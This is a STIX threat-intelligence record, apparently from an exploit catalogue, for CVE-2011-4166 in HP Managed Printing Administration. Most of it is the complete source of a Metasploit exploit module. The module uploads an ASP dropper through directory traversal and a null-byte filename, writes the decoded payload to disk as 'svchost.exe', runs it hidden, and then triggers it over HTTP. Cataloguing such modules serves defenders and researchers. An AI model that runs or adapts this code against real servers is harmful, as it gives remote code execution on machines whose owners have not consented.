{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--919a34c9-86f1-4e77-ac4a-3581dd857fda",
    "created": "2024-08-14T16:54:48.968561Z",
    "modified": "2024-08-14T16:54:48.968565Z",
    "name": "HP Managed Printing Administration jobAcct Remote Command Execution",
    "description": " This module exploits an arbitrary file upload vulnerability on HP Managed Printing Administration 2.6.3 and prior versions. The vulnerability exists in the UploadFiles() function from the MPAUploader.Uploader.1 control, loaded and used by the server. The function can be abused via directory traversal and null byte injection in order to achieve arbitrary file upload. In order to exploit successfully, a few conditions must be met. First, a writable location under the context of Internet Guest Account (IUSR_*) or Everyone is required. By default, this module will attempt to write to /hpmpa/userfiles/, but the WRITEWEBFOLDER option can be used to provide another writable path. Second, the writable path must also be readable by a browser so this typically means a location under wwwroot. Finally, you cannot overwrite a file with the same name as the payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_mpa_job_acct.rb",
            "external_id": "hp_mpa_job_acct.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4166"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03128469"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'        => 'HP Managed Printing Administration jobAcct Remote Command Execution',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability on HP Managed Printing\n        Administration 2.6.3 and prior versions. The vulnerability exists in the UploadFiles()\n        function from the MPAUploader.Uploader.1 control, loaded and used by the server.\n        The function can be abused via directory traversal and null byte injection in order\n        to achieve arbitrary file upload. In order to exploit successfully, a few conditions\n        must be met. First, a writable location under the context of Internet Guest Account\n        (IUSR_*) or Everyone is required. By default, this module will attempt to write to\n        /hpmpa/userfiles/, but the WRITEWEBFOLDER option can be used to provide\n        another writable path. Second, the writable path must also be readable by a browser,\n        so this typically means a location under wwwroot. Finally, you cannot overwrite\n        a file with the same name as the payload.\n      },\n      'Author'      => [\n        'Andrea Micalizzi', # aka rgod - Vulnerability Discovery\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          ['CVE', '2011-4166'],\n          ['OSVDB', '78015'],\n          ['BID', '51174'],\n          ['ZDI', '11-352'],\n          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03128469']\n        ],\n      'Targets'     =>\n        [\n          [ 'HP Managed Printing Administration 2.6.3 / Microsoft Windows [XP SP3 | Server 2003 SP2]', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => 'Dec 21 2011'\n    )\n\n    register_options(\n      [\n        OptString.new('WRITEWEBFOLDER', [ false,  \"Additional Web location with file write permissions for IUSR_*\" ])\n      ])\n  end\n\n  def webfolder_uri\n    begin\n      u = datastore['WRITEWEBFOLDER']\n      u = \"/\" if u.nil? or u.empty?\n      URI(u).to_s\n    rescue ::URI::InvalidURIError\n      print_error \"Invalid URI: #{datastore['WRITEWEBFOLDER'].inspect}\"\n      return \"/\"\n    end\n  end\n\n  def to_exe_asp(exes = '')\n\n    var_func    = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)\n\n    var_f64name   = Rex::Text.rand_text_alpha(rand(8)+8)\n    arg_b64string = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_length    = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_out       = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_group     = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_bytes     = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_counter   = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_char      = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_thisdata  = Rex::Text.rand_text_alpha(rand(8)+8)\n    const_base64  = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_ngroup    = Rex::Text.rand_text_alpha(rand(8)+8)\n    var_pout      = Rex::Text.rand_text_alpha(rand(8)+8)\n\n    vbs = \"<%\\r\\n\"\n\n    # ASP Base64 decode from Antonin Foller http://www.motobit.com/tips/detpg_base64/\n    vbs << \"Function #{var_f64name}(ByVal #{arg_b64string})\\r\\n\"\n    vbs << \"Const #{const_base64} = \\\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\\\"\\r\\n\"\n    vbs << \"Dim #{var_length}, #{var_out}, #{var_group}\\r\\n\"\n    vbs << \"#{arg_b64string} = Replace(#{arg_b64string}, vbCrLf, \\\"\\\")\\r\\n\"\n    vbs << \"#{arg_b64string} = Replace(#{arg_b64string}, vbTab, \\\"\\\")\\r\\n\"\n    vbs << \"#{arg_b64string} = Replace(#{arg_b64string}, \\\" \\\", \\\"\\\")\\r\\n\"\n    vbs << \"#{var_length} = Len(#{arg_b64string})\\r\\n\"\n    vbs << \"If #{var_length} Mod 4 <> 0 Then\\r\\n\"\n    vbs << \"Exit Function\\r\\n\"\n    vbs << \"End If\\r\\n\"\n    vbs << \"For #{var_group} = 1 To #{var_length} Step 4\\r\\n\"\n    vbs << \"Dim #{var_bytes}, #{var_counter}, #{var_char}, #{var_thisdata}, #{var_ngroup}, #{var_pout}\\r\\n\"\n    vbs << \"#{var_bytes} = 3\\r\\n\"\n    vbs << \"#{var_ngroup} = 0\\r\\n\"\n    vbs << \"For #{var_counter} = 0 To 3\\r\\n\"\n    vbs << \"#{var_char} = Mid(#{arg_b64string}, #{var_group} + #{var_counter}, 1)\\r\\n\"\n    vbs << \"If #{var_char} = \\\"=\\\" Then\\r\\n\"\n    vbs << \"#{var_bytes} = #{var_bytes} - 1\\r\\n\"\n    vbs << \"#{var_thisdata} = 0\\r\\n\"\n    vbs << \"Else\\r\\n\"\n    vbs << \"#{var_thisdata} = InStr(1, #{const_base64}, #{var_char}, vbBinaryCompare) - 1\\r\\n\"\n    vbs << \"End If\\r\\n\"\n    vbs << \"If #{var_thisdata} = -1 Then\\r\\n\"\n    vbs << \"Exit Function\\r\\n\"\n    vbs << \"End If\\r\\n\"\n    vbs << \"#{var_ngroup} = 64 * #{var_ngroup} + #{var_thisdata}\\r\\n\"\n    vbs << \"Next\\r\\n\"\n    vbs << \"#{var_ngroup} = Hex(#{var_ngroup})\\r\\n\"\n    vbs << \"#{var_ngroup} = String(6 - Len(#{var_ngroup}), \\\"0\\\") & #{var_ngroup}\\r\\n\"\n    vbs << \"#{var_pout} = Chr(CByte(\\\"&H\\\" & Mid(#{var_ngroup}, 1, 2))) + _\\r\\n\"\n    vbs << \"Chr(CByte(\\\"&H\\\" & Mid(#{var_ngroup}, 3, 2))) + _\\r\\n\"\n    vbs << \"Chr(CByte(\\\"&H\\\" & Mid(#{var_ngroup}, 5, 2)))\\r\\n\"\n    vbs << \"#{var_out} = #{var_out} & Left(#{var_pout}, #{var_bytes})\\r\\n\"\n    vbs << \"Next\\r\\n\"\n    vbs << \"#{var_f64name} = #{var_out}\\r\\n\"\n    vbs << \"End Function\\r\\n\"\n\n    vbs << \"Sub #{var_func}()\\r\\n\"\n    vbs << \"#{var_bytes} = #{var_f64name}(\\\"#{Rex::Text.encode_base64(exes)}\\\")\\r\\n\"\n    vbs << \"Dim #{var_obj}\\r\\n\"\n    vbs << \"Set #{var_obj} = CreateObject(\\\"Scripting.FileSystemObject\\\")\\r\\n\"\n    vbs << \"Dim #{var_stream}\\r\\n\"\n    vbs << \"Dim #{var_tempdir}\\r\\n\"\n    vbs << \"Dim #{var_tempexe}\\r\\n\"\n    vbs << \"Dim #{var_basedir}\\r\\n\"\n    vbs << \"Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\\r\\n\"\n\n    vbs << \"#{var_basedir} = #{var_tempdir} & \\\"\\\\\\\" & #{var_obj}.GetTempName()\\r\\n\"\n    vbs << \"#{var_obj}.CreateFolder(#{var_basedir})\\r\\n\"\n    vbs << \"#{var_tempexe} = #{var_basedir} & \\\"\\\\\\\" & \\\"svchost.exe\\\"\\r\\n\"\n    vbs << \"Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\\r\\n\"\n    vbs << \"#{var_stream}.Write #{var_bytes}\\r\\n\"\n    vbs << \"#{var_stream}.Close\\r\\n\"\n    vbs << \"Dim #{var_shell}\\r\\n\"\n    vbs << \"Set #{var_shell} = CreateObject(\\\"Wscript.Shell\\\")\\r\\n\"\n\n    vbs << \"#{var_shell}.run #{var_tempexe}, 0, false\\r\\n\"\n    vbs << \"End Sub\\r\\n\"\n\n    vbs << \"#{var_func}\\r\\n\"\n    vbs << \"%>\\r\\n\"\n    vbs\n  end\n\n  def upload(contents, location)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"upload\", nil, nil, \"form-data; name=\\\"upload\\\"\")\n    post_data.add_part(contents, \"application/octet-stream\", \"binary\", \"form-data; name=\\\"uploadfile\\\"; filename=\\\"..\\\\../../wwwroot#{location}\\x00.tmp\\\"\")\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri(\"hpmpa\", \"jobAcct\", \"Default.asp\"),\n      'method'   => 'POST',\n      'ctype'    => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data'     => data,\n      'encode_params' => false,\n      'vars_get' => {\n        'userId' => rand_text_numeric(2+rand(2)),\n        'jobId'  => rand_text_numeric(2+rand(2))\n        }\n      })\n    return res\n  end\n\n  def check\n    res = send_request_cgi({'uri' => normalize_uri(\"hpmpa\", \"home\", \"Default.asp\")})\n    version = nil\n    if res and res.code == 200 and res.body =~ /HP Managed Printing Administration/ and res.body =~ /<dd>v(.*)<\\/dd>/\n      version = $1\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    vprint_status(\"HP MPA Version Detected: #{version}\")\n\n    if version <= \"2.6.3\"\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n    # Generate the ASP containing the EXE containing the payload\n    exe = generate_payload_exe\n    # Not using Msf::Util::EXE.to_exe_asp because the generated vbs is too long and the app complains\n    asp = to_exe_asp(exe)\n\n    #\n    # UPLOAD\n    #\n    asp_name = \"#{rand_text_alpha(5+rand(3))}.asp\"\n    locations = [\n      \"/hpmpa/userfiles/images/printers/\",\n      \"/hpmpa/userfiles/images/backgrounds/\",\n      \"/hpmpa/userfiles/images/\",\n      \"/hpmpa/userfiles/\",\n      \"/\"\n    ]\n\n    locations << normalize_uri(webfolder_uri, asp_name) if datastore['WRITEWEBFOLDER']\n\n    payload_url = \"\"\n\n    locations.each {|location|\n      asp_location = location + asp_name\n      print_status(\"Uploading #{asp.length} bytes to #{location}...\")\n      res = upload(asp, asp_location)\n      if res and res.code == 200 and res.body =~ /Results of Upload/ and res.body !~ /Object\\[formFile\\]/\n        print_good(\"ASP Payload successfully wrote to #{location}\")\n        payload_url = asp_location\n        break\n      elsif res and res.code == 200 and res.body =~ /Results of Upload/ and res.body =~ /Object\\[formFile\\]/\n        print_error(\"Error probably due to permissions while writing to #{location}\")\n      else\n        print_error(\"Unknown error while while writing to #{location}\")\n      end\n    }\n\n    if payload_url.empty?\n      fail_with(Failure::NotVulnerable, \"#{peer} - Failed to upload ASP payload to the target\")\n    end\n\n    #\n    # EXECUTE\n    #\n    print_status(\"Executing payload through #{payload_url}...\")\n    send_request_cgi({ 'uri' => payload_url})\n  end\nend\n\n",
    "x_mitre_disclosure_date": "Dec 21 2011",
    "x_mitre_platforms": [
        "win'"
    ]
}